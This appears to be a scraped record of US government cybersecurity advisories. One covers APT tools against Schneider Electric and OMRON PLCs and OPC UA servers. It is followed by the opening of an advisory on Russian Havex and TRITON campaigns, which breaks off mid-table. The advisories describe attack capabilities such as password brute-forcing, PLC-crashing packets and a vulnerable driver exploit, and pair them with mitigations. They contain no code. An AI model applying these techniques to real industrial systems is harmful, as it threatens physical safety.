Run a rapid scan that identifies all Schneider PLCs on the local network via User Datagram Protocol (UDP) multicast with a destination port of 27127 (Note: UDP 27127 is a standard discovery scan used by engineering workstations to discover PLCs and may not be indicative of malicious activity);
Brute-force Schneider Electric PLC passwords using CODESYS and other available device protocols via UDP port 1740 against defaults or a dictionary word list (Note: this capability may work against other CODESYS-based devices depending on individual design and function, and this report will be updated as more information becomes available); 
Conduct a denial-of-service attack to prevent network communications from reaching the PLC;
Sever connections, requiring users to re-authenticate to the PLC, likely to facilitate capture of credentials; 
Conduct a ‘packet of death’ attack to crash the PLC until a power cycle and configuration recovery is conducted; and 
Send custom Modbus commands (Note: this capability may work against Modbus other than in Schneider Electric PLCs).

Refer to the appendix for tactics, techniques, and procedures (TTPs) associated with this tool.
APT Tool for OMRON 
The APT actors’ tool for OMRON devices has modules that can interact by:

Scanning for OMRON using Factory Interface Network Service (FINS) protocol;
Parsing the Hypertext Transfer Protocol (HTTP) response from OMRON devices;
Retrieving the media access control (MAC) address of the device;
Polling for specific devices connected to the PLC;
Backing up/restoring arbitrary files to/from the PLC; and
Loading a custom malicious agent on OMRON PLCs for additional attacker-directed capability.

Additionally, the OMRON modules can upload an agent that allows a cyber actor to connect and initiate commands—such as file manipulation, packet captures, and code execution—via HTTP and/or Hypertext Transfer Protocol Secure (HTTPS). 
Refer to the appendix for TTPs associated with this tool.
APT Tool for OPC UA 
The APT actors’ tool for OPC UA has modules with basic functionality to identify OPC UA servers and to connect to an OPC UA server using default or previously compromised credentials. The client can read the OPC UA structure from the server and potentially write tag values available via OPC UA.
The threat from this tool can be significantly reduced by properly configuring OPC UA security. Refer to the Mitigations below for more information. 
Refer to the appendix for TTPs associated with this tool.

Mitigations

Note: these mitigations are provided to enable network defenders to begin efforts to protect systems and devices from new capabilities. They have not been verified against every environment and should be tested prior to implementing.
DOE, CISA, NSA, and the FBI recommend all organizations with ICS/SCADA devices implement the following proactive mitigations:

Isolate ICS/SCADA systems and networks from corporate and internet networks using strong perimeter controls, and limit any communications entering or leaving ICS/SCADA perimeters. 
Enforce multifactor authentication for all remote access to ICS networks and devices whenever possible.
Have a cyber incident response plan, and exercise it regularly with stakeholders in IT, cybersecurity, and operations.
Change all passwords to ICS/SCADA devices and systems on a consistent schedule, especially all default passwords, to device-unique strong passwords to mitigate password brute force attacks and to give defender monitoring systems opportunities to detect common attacks.
Ensure OPC UA security is correctly configured with application authentication enabled and explicit trust lists. 
Ensure the OPC UA certificate private keys and user passwords are stored securely. 
Maintain known-good offline backups for faster recovery upon a disruptive attack, and conduct hashing and integrity checks on firmware and controller configuration files to ensure validity of those backups. 
Limit ICS/SCADA systems’ network connections to only specifically allowed management and engineering workstations.
Robustly protect management systems by configuring Device Guard, Credential Guard, and Hypervisor Code Integrity (HVCI). Install Endpoint Detection and Response (EDR) solutions on these subnets and ensure strong anti-virus file reputation settings are configured.
Implement robust log collection and retention from ICS/SCADA systems and management subnets.
Leverage a continuous OT monitoring solution to alert on malicious indicators and behaviors, watching internal systems and communications for known hostile actions and lateral movement. For enhanced network visibility to potentially identify abnormal traffic, consider using CISA’s open-source Industrial Control Systems Network Protocol Parsers (ICSNPP).
Ensure all applications are only installed when necessary for operation. 
Enforce principle of least privilege. Only use admin accounts when required for tasks, such as installing software updates. 
Investigate symptoms of a denial of service or connection severing, which exhibit as delays in communications processing, loss of function requiring a reboot, and delayed actions to operator comments as signs of potential malicious activity.
Monitor systems for loading of unusual drivers, especially for ASRock driver if no ASRock driver is normally used on the system. 

Resources
For additional guidance on securing OT devices, see 

Layering Network Security Through Segmentation, 
Stop Malicious Cyber Activity Against Connected Operational Technology, and
NSA and CISA Recommend Immediate Actions to Reduce Exposure Across Operational Technologies and Control Systems.  

For additional guidance on securing OPC UA enabled devices, see: 

Practical Security Recommendations for building OPC UA Applications

For more information on APT actors’ tools and TTPs, refer to: 

Mandiant’s Blog – INCONTROLLER: New State-Sponsored Cyber Attack Tools Target Multiple Industrial Control Systems
Dragos’ Blog – CHERNOVITE'S PIPEDREAM: Malware Targeting Industrial Control Systems

Disclaimer
The information in this report is being provided “as is” for informational purposes only. DOE, CISA, NSA, and the FBI do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the DOE, CISA, NSA, or the FBI, and this guidance shall not be used for advertising or product endorsement purposes.
Acknowledgements
The DOE, CISA, NSA, and the FBI would like to thank Dragos, Mandiant, Microsoft, Palo Alto Networks, and Schneider Electric for their contributions to this joint CSA.
Appendix: APT Cyber Tools Tactics, Techniques, and Procedures
See tables 1 through 3 for TTPs associated with the cyber actors’ tools described in this CSA mapped to the MITRE ATT&CK for ICS framework. See the ATT&CK for ICS framework for all referenced threat actor tactics and techniques.
Table 1: APT Tool for Schneider Electric ICS TTPs



Tactic
Technique




Execution
Command-Line Interface [T0807]


Scripting [T0853]


Persistence
Modify Program [T0889]


System Firmware [T0857]


Valid Accounts [T0859]


Discovery
Remote System Discovery [T0846]


Remote System Information Discovery [T0888]


Lateral Movement
Default Credentials [T0812]


Program Download [T0843]


Valid Accounts [T0859]


Collection
 


Monitor Process State [T0801]


Program Upload [T0845]


Monitor Process State [T0801]


Command and Control
Commonly Used Port [T0885]


Standard Application Layer Protocol [T0869]


Inhibit Response Function
Block Reporting Message [T0804]


Block Command Message [T0803]


Denial of Service [T0814]


Data Destruction [T0809]


Device Restart/Shutdown [T0816]


System Firmware [T0857]


Impair Process Control
Modify Parameter [T0836]


Unauthorized Command Message [T0855]


Impact
Denial of Control [T0813]


Denial of View [T0815]


Loss of Availability [T0826]


Loss of Control [T0827]


Loss of Productivity and Revenue [T0828]


Manipulation of Control [T0831]


Theft of Operational Information [T0882]



 
Table 2: APT Tool for OMRON ICS TTPs



Tactic
Technique




Initial Access
Remote Services [T0886]


Execution
Command-Line Interface [T0807]


Scripting [T0853]


Change Operating Mode [T0858]


Modify Controller Tasking [T0821]


Native API [T0834]


Persistence
Modify Program [T0889]


Valid Accounts [T0859]


Evasion
Change Operating Mode [T0858]


Discovery 
Network Sniffing [T0842]


Remote System Discovery [T0846]


Remote System Information Discovery [T0888]


Lateral Movement
Default Credentials [T0812]


Lateral Tool Transfer [T0867]


Program Download [T0843]


Remote Services [T0886]


Valid Accounts [T0859]


Collection
Detect Operating Mode [T0868]


Monitor Process State [T0801]


Program Upload [T0845]


Command and Control
Commonly Used Port [T0885]


Standard Application Layer Protocol [T0869]


Inhibit Response Function
Service Stop [T0881]


Impair Process Control
Modify Parameter [T0836]


Unauthorized Command Message [T0855]


Impact
Damage to Property [T0879]


Loss of Safety [T0837]


Manipulation of Control [T0831]


Theft of Operational Information [T0882]



 
Table 3: APT Tool for OPC UA ICS TTPs



Tactic
Technique




Execution
Command-Line Interface [T0807]


Scripting [T0853]


Persistence
Valid Accounts [T0859]


Discovery
Remote System Discovery [T0846]


Remote System Information Discovery [T0888]


Lateral Movement
Valid Accounts [T0859]


Collection
Monitor Process State [T0801]


Point & Tag Identification [T0861]


Command and Control
Commonly Used Port [T0885]


Standard Application Layer Protocol [T0869]


Impact
Manipulation of View [T0832]


Theft of Operational Information [T0882]




Contact Information

Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472) and/or to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov. 

Revisions

April 13, 2022: Initial Version|April 14. 2022: Added Resources|May 25, 2022: Added Additional Mitigations and Resources






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T0882', 'T0801', 'T0832', 'T0843', 'T0831', 'T0859', 'T0804', 'T0803', 'T0816', 'T0855', 'T0812', 'T0828', 'T0858', 'T0845', 'T0889', 'T0879', 'T0813', 'T0868', 'T0885', 'T0814', 'T0821', 'T0867', 'T0807', 'T0836', 'T0842', 'T0834', 'T0857', 'T0837', 'T0861', 'T0869', 'T0826', 'T0888', 'T0815', 'T0886', 'T0827', 'T0853', 'T0881', 'T0809', 'T0846'}","




Summary

Actions to Take Today to Protect ICS/SCADA Devices:• Enforce multifactor authentication for all remote access to ICS networks and devices whenever possible.• Change all passwords to ICS/SCADA devices and systems on a consistent schedule, especially all default passwords, to device-unique strong passwords to mitigate password brute force attacks and to give defender monitoring systems opportunities to detect common attacks.• Leverage a properly installed continuous OT monitoring solution to log and alert on malicious indicators and behaviors.
The Department of Energy (DOE), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory (CSA) to warn that certain advanced persistent threat (APT) actors have exhibited the capability to gain full system access to multiple industrial control system (ICS)/supervisory control and data acquisition (SCADA) devices, including:

Schneider Electric programmable logic controllers (PLCs),
OMRON Sysmac NEX PLCs, and
Open Platform Communications Unified Architecture (OPC UA) servers.

The APT actors have developed custom-made tools for targeting ICS/SCADA devices. The tools enable them to scan for, compromise, and control affected devices once they have established initial access to the operational technology (OT) network. Additionally, the actors can compromise Windows-based engineering workstations, which may be present in information technology (IT) or OT environments, using an exploit that compromises an ASRock motherboard driver with known vulnerabilities. By compromising and maintaining full system access to ICS/SCADA devices, APT actors could elevate privileges, move laterally within an OT environment, and disrupt critical devices or functions.
DOE, CISA, NSA, and the FBI urge critical infrastructure organizations, especially Energy Sector organizations, to implement the detection and mitigation recommendations provided in this CSA to detect potential malicious APT activity and harden their ICS/SCADA devices. 
Click here for a PDF version of this report. 

Technical Details

APT actors have developed custom-made tools that, once they have established initial access in an OT network, enables them to scan for, compromise, and control certain ICS/SCADA devices, including the following:

Schneider Electric MODICON and MODICON Nano PLCs, including (but may not be limited to) TM251, TM241, M258, M238, LMC058, and LMC078;
OMRON Sysmac NJ and NX PLCs, including (but may not be limited to) NEX NX1P2, NX-SL3300, NX-ECC203, NJ501-1300, S8VK, and R88D-1SN10F-ECT; and 
OPC Unified Architecture (OPC UA) servers.  

The APT actors’ tools have a modular architecture and enable cyber actors to conduct highly automated exploits against targeted devices. The tools have a virtual console with a command interface that mirrors the interface of the targeted ICS/SCADA device. Modules interact with targeted devices, enabling operations by lower-skilled cyber actors to emulate higher-skilled actor capabilities.
The APT actors can leverage the modules to scan for targeted devices, conduct reconnaissance on device details, upload malicious configuration/code to the targeted device, back up or restore device contents, and modify device parameters. 
In addition, the APT actors can use a tool that installs and exploits a known-vulnerable ASRock-signed motherboard driver, AsrDrv103.sys, exploiting CVE-2020-15368 to execute malicious code in the Windows kernel. Successful deployment of this tool can allow APT actors to move laterally within an IT or OT environment and disrupt critical devices or functions.
APT Tool for Schneider Electric Devices  
The APT actors’ tool for Schneider Electric devices has modules that interact via normal management protocols and Modbus (TCP 502). Modules may allow cyber actors to:

Run a rapid scan that identifies all Schneider PLCs on the local network via User Datagram Protocol (UDP) multicast with a destination port of 27127 (Note: UDP 27127 is a standard discovery scan used by engineering workstations to discover PLCs and may not be indicative of malicious activity);
Brute-force Schneider Electric PLC passwords using CODESYS and other available device protocols via UDP port 1740 against defaults or a dictionary word list (Note: this capability may work against other CODESYS-based devices depending on individual design and function, and this report will be updated as more information becomes available); 
Conduct a denial-of-service attack to prevent network communications from reaching the PLC;
Sever connections, requiring users to re-authenticate to the PLC, likely to facilitate capture of credentials; 
Conduct a ‘packet of death’ attack to crash the PLC until a power cycle and configuration recovery is conducted; and 
Send custom Modbus commands (Note: this capability may work against Modbus other than in Schneider Electric PLCs).

Refer to the appendix for tactics, techniques, and procedures (TTPs) associated with this tool.
APT Tool for OMRON 
The APT actors’ tool for OMRON devices has modules that can interact by:

Scanning for OMRON using Factory Interface Network Service (FINS) protocol;
Parsing the Hypertext Transfer Protocol (HTTP) response from OMRON devices;
Retrieving the media access control (MAC) address of the device;
Polling for specific devices connected to the PLC;
Backing up/restoring arbitrary files to/from the PLC; and
Loading a custom malicious agent on OMRON PLCs for additional attacker-directed capability.

Additionally, the OMRON modules can upload an agent that allows a cyber actor to connect and initiate commands—such as file manipulation, packet captures, and code execution—via HTTP and/or Hypertext Transfer Protocol Secure (HTTPS). 
Refer to the appendix for TTPs associated with this tool.
APT Tool for OPC UA 
The APT actors’ tool for OPC UA has modules with basic functionality to identify OPC UA servers and to connect to an OPC UA server using default or previously compromised credentials. The client can read the OPC UA structure from the server and potentially write tag values available via OPC UA.
The threat from this tool can be significantly reduced by properly configuring OPC UA security. Refer to the Mitigations below for more information. 
Refer to the appendix for TTPs associated with this tool.

Mitigations

Note: these mitigations are provided to enable network defenders to begin efforts to protect systems and devices from new capabilities. They have not been verified against every environment and should be tested prior to implementing.
DOE, CISA, NSA, and the FBI recommend all organizations with ICS/SCADA devices implement the following proactive mitigations:

Isolate ICS/SCADA systems and networks from corporate and internet networks using strong perimeter controls, and limit any communications entering or leaving ICS/SCADA perimeters. 
Enforce multifactor authentication for all remote access to ICS networks and devices whenever possible.
Have a cyber incident response plan, and exercise it regularly with stakeholders in IT, cybersecurity, and operations.
Change all passwords to ICS/SCADA devices and systems on a consistent schedule, especially all default passwords, to device-unique strong passwords to mitigate password brute force attacks and to give defender monitoring systems opportunities to detect common attacks.
Ensure OPC UA security is correctly configured with application authentication enabled and explicit trust lists. 
Ensure the OPC UA certificate private keys and user passwords are stored securely. 
Maintain known-good offline backups for faster recovery upon a disruptive attack, and conduct hashing and integrity checks on firmware and controller configuration files to ensure validity of those backups. 
Limit ICS/SCADA systems’ network connections to only specifically allowed management and engineering workstations.
Robustly protect management systems by configuring Device Guard, Credential Guard, and Hypervisor Code Integrity (HVCI). Install Endpoint Detection and Response (EDR) solutions on these subnets and ensure strong anti-virus file reputation settings are configured.
Implement robust log collection and retention from ICS/SCADA systems and management subnets.
Leverage a continuous OT monitoring solution to alert on malicious indicators and behaviors, watching internal systems and communications for known hostile actions and lateral movement. For enhanced network visibility to potentially identify abnormal traffic, consider using CISA’s open-source Industrial Control Systems Network Protocol Parsers (ICSNPP).
Ensure all applications are only installed when necessary for operation. 
Enforce principle of least privilege. Only use admin accounts when required for tasks, such as installing software updates. 
Investigate symptoms of a denial of service or connection severing, which exhibit as delays in communications processing, loss of function requiring a reboot, and delayed actions to operator comments as signs of potential malicious activity.
Monitor systems for loading of unusual drivers, especially for ASRock driver if no ASRock driver is normally used on the system. 

Resources
For additional guidance on securing OT devices, see 

Layering Network Security Through Segmentation, 
Stop Malicious Cyber Activity Against Connected Operational Technology, and
NSA and CISA Recommend Immediate Actions to Reduce Exposure Across Operational Technologies and Control Systems.  

For additional guidance on securing OPC UA enabled devices, see: 

Practical Security Recommendations for building OPC UA Applications

For more information on APT actors’ tools and TTPs, refer to: 

Mandiant’s Blog – INCONTROLLER: New State-Sponsored Cyber Attack Tools Target Multiple Industrial Control Systems
Dragos’ Blog – CHERNOVITE'S PIPEDREAM: Malware Targeting Industrial Control Systems

Disclaimer
The information in this report is being provided “as is” for informational purposes only. DOE, CISA, NSA, and the FBI do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the DOE, CISA, NSA, or the FBI, and this guidance shall not be used for advertising or product endorsement purposes.
Acknowledgements
The DOE, CISA, NSA, and the FBI would like to thank Dragos, Mandiant, Microsoft, Palo Alto Networks, and Schneider Electric for their contributions to this joint CSA.
Appendix: APT Cyber Tools Tactics, Techniques, and Procedures
See tables 1 through 3 for TTPs associated with the cyber actors’ tools described in this CSA mapped to the MITRE ATT&CK for ICS framework. See the ATT&CK for ICS framework for all referenced threat actor tactics and techniques.
Table 1: APT Tool for Schneider Electric ICS TTPs

 
Table 2: APT Tool for OMRON ICS TTPs

 
Table 3: APT Tool for OPC UA ICS TTPs


Contact Information

Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472) and/or to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov. 

Revisions

April 13, 2022: Initial Version|April 14. 2022: Added Resources|May 25, 2022: Added Additional Mitigations and Resources






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-103a
51,"




Summary

Actions to Take Today to Protect Energy Sector Networks:• Implement and ensure robust network segmentation between IT and ICS networks.• Enforce MFA to authenticate to a system.• Manage the creation of, modification of, use of—and permissions associated with—privileged accounts.
This joint Cybersecurity Advisory (CSA)—coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Energy (DOE)—provides information on multiple intrusion campaigns conducted by state-sponsored Russian cyber actors from 2011 to 2018 and targeted U.S. and international Energy Sector organizations. CISA, the FBI, and DOE responded to these campaigns with appropriate action in and around the time that they occurred. CISA, the FBI, and DOE are sharing this information in order to highlight historical tactics, techniques, and procedures (TTPs) used by adversaries to target U.S. and international Energy Sector organizations.
On March 24, 2022, the U.S. Department of Justice unsealed indictments of three Russian Federal Security Service (FSB) officers and a Russian Federation Central Scientific Research Institute of Chemistry and Mechanics (TsNIIKhM) employee for their involvement in the following intrusion campaigns against U.S. and international oil refineries, nuclear facilities, and energy companies.[1]

Global Energy Sector Intrusion Campaign, 2011 to 2018: the FSB conducted a multi-stage campaign in which they gained remote access to U.S. and international Energy Sector networks, deployed ICS-focused malware, and collected and exfiltrated enterprise and ICS-related data. 

One of the indicted FSB officers was involved in campaign activity that involved deploying Havex malware to victim networks. 
The other two indicted FSB officers were involved in activity targeting U.S. Energy Sector networks from 2016 through 2018.


Compromise of Middle East-based Energy Sector organization with TRITON Malware, 2017: Russian cyber actors with ties to the TsNIIKhM gained access to and leveraged TRITON (also known as HatMan) malware to manipulate a foreign oil refinery’s ICS controllers. TRITON was designed to specifically target Schneider Electric’s Triconex Tricon safety systems and is capable of disrupting those systems. Schneider Electric has issued a patch to mitigate the risk of the TRITON malware’s attack vector; however, network defenders should install the patch and remain vigilant against these threat actors’ TTPs.

The indicted TsNIIKhM cyber actor is charged with attempt to access U.S. protected computer networks and to cause damage to an energy facility.
The indicted TsNIIKhM cyber actor was a co-conspirator in the deployment of the TRITON malware in 2017.



This CSA provides the TTPs used by indicted FSB and TsNIIKhM actors in cyber operations against the global Energy Sector. Specifically, this advisory maps TTPs used in the global Energy Sector campaign and the compromise of the Middle East-based Energy Sector organization to the MITRE ATT&CK for Enterprise and ATT&CK for ICS frameworks.
CISA, the FBI, and DOE assess that state-sponsored Russian cyber operations continue to pose a threat to U.S. Energy Sector networks. CISA, the FBI, and DOE urge the Energy Sector and other critical infrastructure organizations to apply the recommendations listed in the Mitigations section of this advisory and Appendix A to reduce the risk of compromise. 
For more information on Russian state-sponsored malicious cyber activity, see CISA's Russia Cyber Threat Overview and Advisories webpage. For more information on the threat of Russian state-sponsored malicious cyber actors to U.S. critical infrastructure as well as additional mitigation recommendations, see joint CSA Understanding and Mitigating Russian State-Sponsored Cyber Threats to U.S. Critical Infrastructure and CISA's Shields Up Technical Guidance webpage. 
Rewards for Justice Program
If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State’s (DOS) Rewards for Justice program. You may be eligible for a reward of up to $10 million, which DOS is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact +1-202-702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details refer to rewardsforjustice.net.
Click here for a PDF version of this report. 

Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10, and the ATT&CK for ICSs framework. See the ATT&CK for Enterprise and ATT&CK for ICS frameworks for all referenced threat actor tactics and techniques.
Global Energy Sector Intrusion Campaign, 2011 to 2018
From at least 2011 through 2018, the FSB (also known as Berserk Bear, Energetic Bear, TeamSpy, Dragonfly, Havex, Crouching Yeti, and Koala) conducted an intrusion campaign against international and U.S. Energy Sector organizations. The threat actor gained remote access to and deployed malware designed to collect ICS-related information on compromised Energy Sector networks, and exfiltrated enterprise and ICS data.
Beginning in 2013 and continuing through 2014, the threat actor leveraged Havex malware on Energy Sector networks. The threat actor gained access to these victim networks via spearphishing emails, redirects to compromised websites, and malicious versions of legitimate software updates on multiple ICS vendor websites. The new software updates contained installations of Havex malware, which infected systems of users who downloaded the compromised updates.
Havex is a remote access Trojan (RAT) that communicates with a command and control (C2) server. The C2 server deploys payloads that enumerate all collected network resources and uses the Open Platform Communications (OPC) standard to gather information about connected control systems devices and resources within the network. Havex allowed the actor to install additional malware and extract data, including system information, lists of files and installed programs, e-mail address books, and virtual private network (VPN) configuration files. The Havex payload can cause common OPC platforms to crash, which could cause a denial-of-service condition on applications that rely on OPC communications. Note: for additional information on Havex, see to CISA ICS Advisory ICS Focused Malware and CISA ICS Alert ICS Focused Malware (Update A).
Beginning in 2016, the threat actor began widely targeting U.S. Energy Sector networks. The actor conducted these attacks in two stages: first targeting third-party commercial organizations (such as vendors, integrators, and suppliers) and then targeting Energy Sector organizations. The threat actor used the compromised third-party infrastructure to conduct spearphishing, watering hole, and supply chain attacks to harvest Energy Sector credentials and to pivot to Energy Sector enterprise networks. After obtaining access to the U.S. Energy Sector networks, the actor conducted network discovery, moved laterally, gained persistence, then collected and exfiltrated information pertaining to ICS from the enterprise, and possibly operational technology (OT), environments. Exfiltrated information included: vendor information, reference documents, ICS architecture, and layout diagrams.
For more detailed information on FSB targeting of U.S. Energy Sector networks, See CISA Alert Russian Government Cyber Activity Targeting Energy Sector and Other Critical Infrastructure Sectors.  
Refer to Appendix A for TTPs of Havex malware and TTPs used by the actor in the 2016 to 2018 targeting of U.S. Energy Sector networks, as well as associated mitigations.
Compromise of Middle East-based Energy Sector Organization with TRITON Malware, 2017
In 2017, Russian cyber actors with ties to TsNIIKhM gained access to and manipulated a foreign oil refinery’s safety devices. TsNIIKhM actors used TRITON malware on the ICS controllers, which resulted in the refinery shutting down for several days. 
TRITON is a custom-built, sophisticated, multi-stage malware affecting Schneider Electric’s Triconex Tricon, a safety programmable logic controller (PLC) (also referred to as a safety instrumented system [SIS]), which monitors industrial processes to prevent hazardous conditions. TRITON is capable of directly interacting with, remotely controlling, and compromising these safety systems. As these systems are used in a large number of environments, the capacity to disable, inhibit, or modify the ability of a process to fail safely could result in physical consequences. Note: for additional information on affected products, see to CISA ICS Advisory Schneider Electric Triconex Tricon (Update B).
TRITON malware affects Triconex Tricon PLCs by modifying in-memory firmware to add additional programming. The extra functionality allows an attacker to read/modify memory contents and execute custom code, disabling the safety system. 
TRITON malware has multiple components, including a custom Python script, four Python modules, and malicious shellcode that contains an injector and a payload. For detailed information on TRITON’s components, refer to CISA Malware Analysis Report (MAR): HatMan: Safety System Targeted Malware (Update B).
Note: the indicted TsNIIKhM cyber actor was also involved in activity targeting U.S. Energy Sector companies in 2018, and other TsNIIKhM-associated actors have targeted a U.S.-based company’s facilities in an attempt to access the company’s OT systems. To date, CISA, FBI, and DOE have no information to indicate these actors have intentionally disrupted any U.S. Energy Sector infrastructure. 
Refer to Appendix A for TTPs used by TRITON as well as associated mitigations. 

Mitigations

Enterprise Environment
CISA, the FBI, and DOE recommend Energy Sector and other critical infrastructure organizations implement the following mitigations to harden their corporate enterprise network. These mitigations are tailored to combat multiple enterprise techniques observed in these campaigns (refer to Appendix A for observed TTPs and additional mitigations).
Privileged Account Management 

Manage the creation of, modification of, use of—and permissions associated with—privileged accounts, including SYSTEM and root.

Password Policies

Set and enforce secure password policies for accounts.

Disable or Remove Features or Programs

Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.

Audit 

Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc., to identify potential weaknesses.

Operating System Configuration 

Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.

Multifactor Authentication

Enforce multifactor authentication (MFA) by requiring users to provide two or more pieces of information (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.

Filter Network Traffic    

Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.

Network Segmentation

Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a demilitarized zone (DMZ) to contain any internet-facing services that should not be exposed from the internal network.

Limit Access to Resources over the Network

Prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, Remote Desktop Protocol (RDP) gateways, etc.

Execution Prevention

Block execution of code on a system through application control, and/or script blocking.

Industrial Control System Environment
CISA, the FBI, and DOE recommend Energy Sector and other critical infrastructure organizations implement the following mitigations to harden their ICS/OT environment.
Network Segmentation

Implement and ensure robust network segmentation between IT and ICS networks to limit the ability of cyber threat actors to move laterally to ICS networks if the IT network is compromised. 

Implement a network topology for ICS that has multiple layers, with the most critical communications occurring in the most secure and reliable layer. For more information refer to National Institute of Standard and Technology Special Publication 800-82: Guide to Industrial Control Systems (ICS) Security. Further segmentation should be applied to portions of the network that are reliant on one another by functionality. Figure 5 on page 26 of the CISA ICS Defense in Depth Strategy document describes this architecture.
Use one-way communication diodes to prevent external access, whenever possible.
Set up DMZs to create a physical and logical subnetwork that acts as an intermediary for connected security devices to avoid exposure.
Employ reliable network security protocols and services where feasible.


Consider using virtual local area networks (VLANs) for additional network segmentation, for example, by placing all printers in separate, dedicated VLANs and restricting users’ direct printer access. This same principle can be applied to segmentation of portions of the process for which devices are used. As an example, systems that are only involved in the creation of one component within an assembly line that is not directly related to another component can be on separate VLANs, which allows for identification of any unexpected communication, as well as segmentation against potential risk exposure on a larger scale.
Implement perimeter security between network segments to limit the ability of cyber threat actors to move laterally. 

Control traffic between network segments by using firewalls, intrusion detection systems (IDSs), and rules for filtering traffic on routers and switches.
Implement network monitoring at key chokepoints—including egress points to the internet, between network segments, core switch locations—and at key assets or services (e.g., remote access services).
Configure an IDS to create alarms for any ICS traffic outside normal operations (after establishing a baseline of normal operations and network traffic).
Configure security incident and event monitoring to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.



ICS Best Practices

Update all software. Use a risk-based assessment strategy to determine which ICS networks, assets, and zones should participate in the patch management program. 
Test all patches in out-of-band testing environments before implementation into production environments.
Implement application allow listing on human machine interfaces and engineering workstations.
Harden software configuration on field devices, including tablets and smartphones.
Replace all end-of-life software and hardware devices.
Disable unused ports and services on ICS devices (after testing to ensure this will not affect ICS operation).
Restrict and manage remote access software. Enforce MFA for remote access to ICS networks.
Configure encryption and security for network protocols within the ICS environment.
Do not allow vendors to connect their devices to the ICS network. Use of a compromised device could introduce malware. 
Disallow any devices that do not live solely on the ICS environment from communicating on the platform. ‘Transient devices’ provide risk exposure to the ICS environment from malicious activity in the IT or other environments to which they connect.
Maintain an ICS asset inventory of all hardware, software, and supporting infrastructure technologies. 
Maintain robust host logging on critical devices within the ICS environment, such as jump boxes, domain controllers, repository servers, etc. These logs should be aggregated into a centralized log server for review. 
Ensure robust physical security is in place to prevent unauthorized personal from accessing controlled spaces that house ICS equipment.
Regularly test manual controls so that critical functions can be kept running if ICS/OT networks need to be taken offline.

Contact Information
Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472). and/or to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.
References
[1] https://www.justice.gov/opa/pr/four-russian-government-employees-charged-two-historical-hacking-campaigns-targeting-critical[2] https://collaborate.mitre.org/attackics/index.php/Software/S0003 [3] https://collaborate.mitre.org/attackics/index.php/Software/S0003[4] https://collaborate.mitre.org/attackics/index.php/Software/S0013 
APPENDIX A: CAMPAIGN AND MALWARE TACTICS, TECHNIQUES, AND PROCEDURES
Global Energy Sector Campaign: Havex Malware 
Table 1 maps Havex’s capabilities to the ATT&CK for Enterprise framework, and table 2 maps Havex’s capabilities to the ATT&CK for ICS framework. Table 1 also provides associated mitigations. For additional mitigations, refer to the Mitigations section of this advisory.
Table 1: Enterprise Domain Tactics and Techniques for Havex [2]



Tactic
Technique
Use
Detection/Mitigations


Persistence [TA0003]
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]
Havex adds Registry Run keys to achieve persistence.
Monitor: monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.


Privilege Escalation [TA0004]

Process Injection [T1055]
Note: this technique also applies to:

Tactic: Defense Evasion [TA0005]


Havex injects itself into explorer.exe.

Behavior Prevention on End Point: use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, Application Programming Interface (API) call, etc., behavior.
Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.



Defense Evasion [TA0005]
Indicator Removal on Host: File Deletion [T1070.004]
Havex contains a cleanup module that removes traces of itself from victim networks.
